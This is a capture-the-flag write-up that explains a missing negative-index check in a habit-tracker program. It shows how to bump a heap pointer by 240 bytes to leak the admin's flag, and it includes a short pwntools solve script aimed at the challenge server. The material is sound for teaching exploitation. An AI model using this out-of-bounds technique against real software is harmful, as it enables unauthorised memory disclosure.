# Writeup

## TL;DR

The update_habit_counter function allows for out-of-bounds access due to a lack of negative index validation. By creating a dummy habit and accessing the habit at index -3, we can adjust the pointer to point into the first habit of the admin. Adding 240 to this pointer reveals the flag. 240 is the needed offset since each habit will allocate a buffer of size 0x40, which leads to allocation of 0x50 bytes on heap. Since the user has 3 habits, we need offset 0x50 * 3 = 240 bytes offset to at into the first entry of the admin. Since admin is allocated after the user, we need a positive offset.

## Explanation

The program tracks habits for a user and an admin using two `UserAccount` structs. The admin struct contains the flag as its first habit. The vulnerability lies in the `update_habit_counter` function, which does not validate if provided index is negative, allowing for an out-of-bounds access beyond the `counts` array.

The code only checks the upper bound, however `read_int` allows us to enter negative numbers.

```c
// Ensure that only valid habits can be accessed
if (choice > account->active_habits - 1) {
  puts("You're trying to access non-existing habits >:(");
  return;
}
```

Since the habit of the admin contains the flag, we somehow need to leak it from there.

The habits are stored in the `UserAccount` struct as a array of `char *` pointers.

```c
struct UserAccount {
  // 3 habits per user
  char *habits[AMOUNT_HABITS];
  // Array which tracks how often the user has done the habit
  long counts[AMOUNT_HABITS];
  // Amount of currently registered habits
  int active_habits;
};
```

This means that the `habits` array has `AMOUONT_HABITS` entries of memory addresses which point
at a place in memory where the description of the habit is stored. The description is simply
a sequence of bytes (a string), therefore the datatype, which the pointer points at, is a `char`.

This `habits` array is then filled by allocating memory on the heap using `malloc` (memory allocation).

```c
for (int i = 0; i < AMOUNT_HABITS; i++) {
  account->habits[i] = malloc(HABIT_LENGTH);
  account->counts[i] = 0;
}
```

One key thing we have to know to solve this challenge is that `malloc` per default returns
chunks of memory which are directly adjacent to each other on subsequent calls.

This means, if we allocate two chunks of memory using `malloc`, they will be next each other
in memory. Whereas the first chunk will be at a lower memory address and the second chunk at a
higher memory address.

The same logic applies to structs in C. Looking at the `UserAccount` struct, be know
that the `counts` array will be directly after the `habits` struct in memory:

```c
struct UserAccount {
  // 3 habits per user
  char *habits[AMOUNT_HABITS];
  // Array which tracks how often the user has done the habit
  long counts[AMOUNT_HABITS];
  // Amount of currently registered habits
  int active_habits;
};
```

Since we can perform out-of-bounds accesses, we can freely increment pointers in the `habits`
array to make them point at different locations in memory. Since the `admin` struct is allocated
after the `user` struct, we know that the `admin` habits will be allocated directly after the
`user` habits in memory.

```c
// Initialize the structs properly
initialize_account(&user);
initialize_account(&admin);
```

Now we only need to know the offset between one of our habits and the habits of the admin.

The offset can be determined using varies techniques:
- Bruteforce, just trying out always increasing offsets
- Using a debugger. Inspecting the memory reveals the offset
- Little bit of math. Each allocation size is a multiple of 0x10.
  Due to the allocation metadata, the allocation size of 0x40 will be increased to 0x50.
  Since the `user` has 3 habits, each of allocation size 0x50, we need to add 3 * 0x50 = 240 bytes
  to reach the first habit of the `admin` struct.

Note that we first need to create a dummy habit since otherwise `account->active_habits` will
be zero and we can't use the `view_habits` functionality.

## Solve Script

```python
import pwn

def add_habit(name: bytes):
  io.sendline(b"2")
  io.sendline(name)

def update_habit(idx: int, amount: int):
  io.sendline(b"3")
  io.sendline(str(idx).encode())
  io.sendline(str(amount).encode())

def view_habits():
  io.sendline(b"1")

io = pwn.remote("challenges.sshuzl.de", 12378)
# io = pwn.process("./habit_tracker")

### Exploit

add_habit(b"dummy")
# abuse OOB access and increment by 240,
# which makes it point at flag in admin habits.
update_habit(-3, 240)
view_habits()

io.interactive()
```
